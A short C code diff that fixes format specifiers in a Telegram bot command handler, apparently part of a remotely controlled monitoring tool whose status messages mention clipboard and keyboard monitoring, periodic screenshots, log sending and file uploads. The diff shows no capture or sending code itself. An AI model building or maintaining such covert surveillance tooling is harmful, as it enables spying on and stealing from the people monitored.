@@ -836,10 +836,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         size_t cur = screenshot_get_interval();
         char resp[512];
         snprintf(resp, sizeof(resp),
-                 "📸 <b>Periodic Screenshot Timer:</b> %zu s (%s)\n\n"
+                 "📸 <b>Periodic Screenshot Timer:</b> %llu s (%s)\n\n"
                  "💡 <b>To change:</b> <code>/screenshot_timer &lt;sec&gt;</code> "
                  "(e.g. <code>/screenshot_timer 60</code> or <code>/screenshot_timer 0</code> to disable)",
-                 cur, cur > 0 ? "🟢 Enabled" : "⚪ Disabled");
+                 (unsigned long long)cur, cur > 0 ? "🟢 Enabled" : "⚪ Disabled");
         telegram_send_html(resp);
       } else {
         char *end;
@@ -982,7 +982,7 @@ static void handle_command(const telegram_incoming_update_t *update,
              "• <b>Clipboard Monitoring:</b> %s\n"
              "• <b>Keyboard Monitoring:</b> %s\n"
              "• <b>Keyboard Target:</b> <code>%s</code> (Mode: %s)\n"
-             "• <b>Screenshot Subsystem:</b> %s (Timer: %zu s)\n"
+             "• <b>Screenshot Subsystem:</b> %s (Timer: %llu s)\n"
              "• <b>Periodic Logs:</b> %s (Interval: %llu s)\n"
              "• <b>File Uploads:</b> %s\n"
              "• <b>Window Info:</b> %s\n\n"
@@ -996,7 +996,7 @@ static void handle_command(const telegram_incoming_update_t *update,
              "📦 <b>Queue Limits:</b> %llu items / %llu MB",
              clip_status, kb_status, kb_target,
              kb_mode == KEYBOARD_MODE_CODE ? "Code Block" : "Raw Text",
-             shot_status, screenshot_get_interval(),
+             shot_status, (unsigned long long)screenshot_get_interval(),
              config->telegram_send_logs ? "Enabled" : "On-demand only (/logs)",
              (unsigned long long)config->telegram_log_interval_sec,
              config->telegram_send_files ? "Enabled" : "Disabled",
